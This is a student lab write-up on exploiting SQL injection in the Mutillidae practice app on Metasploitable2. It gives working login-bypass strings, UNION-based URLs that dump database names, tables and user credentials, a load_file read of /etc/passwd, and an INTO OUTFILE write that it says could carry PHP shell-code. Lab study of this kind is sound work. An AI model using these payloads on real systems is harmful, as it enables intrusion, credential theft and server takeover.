# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/8465a35e-49d2-4c45-a33c-d2480f67f0d8)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/7912d7be-b962-4551-954c-c30b5ecbe057)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/24c8a377-67e0-4630-ad9b-2aea7108b3ed)

Click on the menu Login/Register and register for an account

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/3e8dbcca-01b1-4ef8-b456-0859c0167bb4)

Click on the link “Please register here”

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/712aaefc-50f2-4d90-a484-d6fc4e924347)

Click on “Create Account” to display the following page:

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/5eede094-d0f4-491b-9ddf-fb4f51a6adef)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/ca96e3a3-136c-4803-bdd0-ebd0e74cbdc7)

Click “Login”. The logged in page will show as below:

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/ed04bd98-b3e3-4024-88bb-3735a96115af)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/57a5d780-45e9-4992-9064-64c8056fe42f)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/32d97c64-34f3-4a1d-a005-978884963327)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/a732bd4a-a817-4fa6-abc7-f94872eec77d)

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/8be13127-b8a5-4686-8753-8edfc4615fba)

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/c737cd88-1c38-49d2-a30f-936ca761ac56)

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/79c65e94-ebad-44b2-839f-dd9e64e7e61a)

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/d378193d-62b4-4533-8c3c-27dea74f97c0)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/68e2028e-9a13-49f3-906d-5d471fd04279)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/2d6f9c9b-6a95-45e0-b4d4-a4521469b533)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/1efe3eb4-5a17-4767-a80e-9bb1377000d2)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/cda17e6d-3ba4-4f41-95cb-c56c6eb4a0eb)

As it is having 5 columns the query worked fine and it prov
![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/fd5a8fc2-a5df-4aa6-b424-d1a8627a79a9)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/4f696d9b-5f86-4868-b18b-dae192fb4f76)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.


![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/142785c2-0da7-4e33-8449-9078c49cd4cb)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/e9f51399-c097-4e3d-90ce-e50123035150)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/e3c81cdd-9802-4142-a617-55156f8cbc57)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/b2718cf2-b8ed-488d-a6a8-7842ec72d913)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/f4719234-96ad-4b4f-bf61-63e9eadad8d5)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details





![image](https://github.com/Subhikshaa13/sqlinjection/assets/118787344/a347d036-86e8-4463-8d0a-b68be71dccca)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).




## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
